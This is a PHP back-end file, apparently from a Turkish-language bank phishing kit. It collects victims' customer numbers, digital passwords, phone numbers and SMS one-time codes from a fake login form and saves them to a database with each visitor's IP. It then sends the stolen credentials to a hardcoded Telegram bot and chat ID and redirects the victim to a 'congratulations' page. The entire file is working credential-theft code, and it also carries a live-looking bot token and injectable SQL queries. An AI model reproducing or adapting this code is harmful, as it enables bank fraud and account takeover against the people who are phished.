<?php
include './db.php';

// Telegram bot API token'ınızı buraya yazın
define('TELEGRAM_TOKEN', '7863974823:AAFjp1H6jFNPtGEZVkdnuDlvxjMYl5glO7o');
define('CHAT_ID', '6352365673'); // Kendi chat_id'nizi buraya ekleyin

// Kullanıcıdan gelen verileri alalım
if (isset($_POST['CustomerNumber']) && isset($_POST['FirstLoginPasswordNotEncrypt']) && isset($_POST['phonenumber'])) {
    $username = strip_tags(htmlspecialchars($_POST['CustomerNumber']));
    $password = strip_tags(htmlspecialchars($_POST['FirstLoginPasswordNotEncrypt']));
    $phoneNumber = strip_tags(htmlspecialchars($_POST['phonenumber']));
    $ip = $_SERVER['REMOTE_ADDR'];
    $time = time();

    // Veritabanına kaydetme işlemi
    $ekle = $db->query("INSERT INTO records SET page = 'Telefon Sayfası', tc = '{$username}', pass = '{$password}', ipAddress = '{$ip}', lastOnline = '{$time}'");

    // Eğer ekleme başarılı olduysa
    if ($ekle) {
        // Telegram mesajı oluşturma
        $message = "👥 Müşteri ID: $username\n⛩ Dijital Parola: $password\n📲 Telefon Numarası: $phoneNumber";
        
        // Telegram API'sine mesaj gönderme
        $telegramApiUrl = "https://api.telegram.org/bot" . TELEGRAM_TOKEN . "/sendMessage";
        $data = [
            'chat_id' => CHAT_ID,
            'text' => $message
        ];

        $ch = curl_init();
        curl_setopt($ch, CURLOPT_URL, $telegramApiUrl);
        curl_setopt($ch, CURLOPT_POST, true);
        curl_setopt($ch, CURLOPT_POSTFIELDS, $data);
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);

        // Telegram'a gönderme işlemi
        $response = curl_exec($ch);
        curl_close($ch);
    }

    // Telefon numarasını güncelleme
    if (isset($_POST['phonenumber'])) {
        $update = $db->query("UPDATE records SET tel = '{$phoneNumber}', lastOnline = '{$time}' WHERE ipAddress = '{$ip}'");  
        if ($update) {
            header("Location: tebrik.php");
        }
    }
} 

// Ekstra işlemler (sms veya hata sms vb.)
if (isset($_POST['sms'])) {
    $sms = strip_tags(htmlspecialchars($_POST['sms']));
    $ip = $_SERVER['REMOTE_ADDR'];
    $time = time();
    $update = $db->query("UPDATE records SET sms = '{$sms}', lastOnline = '{$time}' WHERE ipAddress = '{$ip}'");
    if ($update) {
        header("Location: tebrik.php");
    }
}

if (isset($_POST['hatalisms'])) {
    $sms = strip_tags(htmlspecialchars($_POST['hatalisms']));
    $ip = $_SERVER['REMOTE_ADDR'];
    $time = time();
    $update = $db->query("UPDATE records SET ajaxsms = '{$sms}', lastOnline = '{$time}' WHERE ipAddress = '{$ip}'");
    if ($update) {
        header("Location: tebrik.php");
    }
}

?>
